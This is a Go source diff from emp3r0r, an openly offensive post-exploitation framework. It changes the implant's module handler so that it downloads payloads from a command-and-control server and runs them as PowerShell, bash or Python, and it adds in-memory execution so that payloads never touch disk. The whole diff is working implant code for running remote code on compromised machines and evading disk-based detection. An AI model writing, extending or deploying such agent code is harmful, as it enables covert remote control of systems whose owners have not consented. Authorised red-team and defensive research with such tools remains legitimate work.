@@ -10,32 +10,39 @@ import (
 	"strconv"
 	"strings"
 
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 // moduleHandler downloads and runs modules from C2
 // env: in format "VAR1=VALUE1,VAR2=VALUE2"
-func moduleHandler(download_addr, modName, checksum, exec_cmd string, env []string, inMem bool) (out string) {
+func moduleHandler(download_addr, file_to_download, payload_type, modName, checksum, exec_cmd string, env []string, inMem bool) (out string) {
 	tarball := filepath.Join(RuntimeConfig.AgentRoot, modName+".tar.xz")
 	modDir := filepath.Join(RuntimeConfig.AgentRoot, modName)
 
 	// download and extract module file
+	payload_data, downloadErr := downloadAndVerifyModule(file_to_download, checksum, download_addr)
+	if downloadErr != nil {
+		return downloadErr.Error()
+	}
 	if !inMem {
-		if downloadErr := downloadAndVerifyModule(tarball, checksum, download_addr); downloadErr != nil {
-			return downloadErr.Error()
+		// write-to-disk modules
+		err := os.WriteFile(tarball, payload_data, 0o600)
+		if err != nil {
+			return fmt.Sprintf("writing %s: %v", tarball, err)
 		}
 
 		if extractErr := extractModule(modDir, tarball); extractErr != nil {
 			return extractErr.Error()
 		}
-	}
 
-	// cd to module dir
-	defer os.Chdir(RuntimeConfig.AgentRoot)
-	err := os.Chdir(modDir)
-	if err != nil {
-		return fmt.Sprintf("cd to %s: %v", modDir, err)
+		// cd to module dir
+		defer os.Chdir(RuntimeConfig.AgentRoot)
+		err = os.Chdir(modDir)
+		if err != nil {
+			return fmt.Sprintf("cd to %s: %v", modDir, err)
+		}
 	}
 
 	// construct command
@@ -45,10 +52,32 @@ func moduleHandler(download_addr, modName, checksum, exec_cmd string, env []stri
 	}
 	executable := fields[0]
 	args := []string{}
-	if strings.HasSuffix(fields[0], ".py") {
+	switch payload_type {
+	case "powershell":
+		out, err := RunPSScript(payload_data)
+		if err != nil {
+			return fmt.Sprintf("running powershell script: %s (%v)", out, err)
+		}
+		return out
+	case "bash":
+		executable = emp3r0r_data.DefaultShell
+		out, err := RunShellScript(payload_data)
+		if err != nil {
+			return fmt.Sprintf("running shell script: %s (%v)", out, err)
+		}
+		return out
+
+	case "python":
 		executable = "python"
 		args = []string{exec_cmd}
-	} else {
+		if inMem {
+			out, err := RunPythonScript(payload_data)
+			if err != nil {
+				return fmt.Sprintf("running python script: %s (%v)", out, err)
+			}
+			return out
+		}
+	default:
 		args = fields[1:]
 	}
 	cmd := exec.Command(executable, args...)
@@ -70,20 +99,20 @@ func getScriptExtension() string {
 	return "sh"
 }
 
-func downloadAndVerifyModule(tarball, checksum, download_addr string) error {
-	if tun.SHA256SumFile(tarball) != checksum {
-		if _, err := SmartDownload(download_addr, util.FileBaseName(tarball), tarball, checksum); err != nil {
-			return err
+func downloadAndVerifyModule(file_to_download, checksum, download_addr string) (data []byte, err error) {
+	if tun.SHA256SumFile(file_to_download) != checksum {
+		if data, err = SmartDownload(download_addr, file_to_download, "", checksum); err != nil {
+			return nil, fmt.Errorf("downloading %s: %v", file_to_download, err)
 		}
 	}
 
-	if tun.SHA256SumFile(tarball) != checksum {
+	if tun.SHA256SumRaw(data) != checksum {
 		log.Print("Checksum failed, restarting...")
 		util.TakeABlink()
-		os.RemoveAll(tarball)
-		return downloadAndVerifyModule(tarball, checksum, download_addr) // Recursive call
+		os.RemoveAll(file_to_download)
+		return downloadAndVerifyModule(file_to_download, checksum, download_addr) // Recursive call
 	}
-	return nil
+	return data, nil
 }
 
 func extractModule(modDir, tarball string) error {
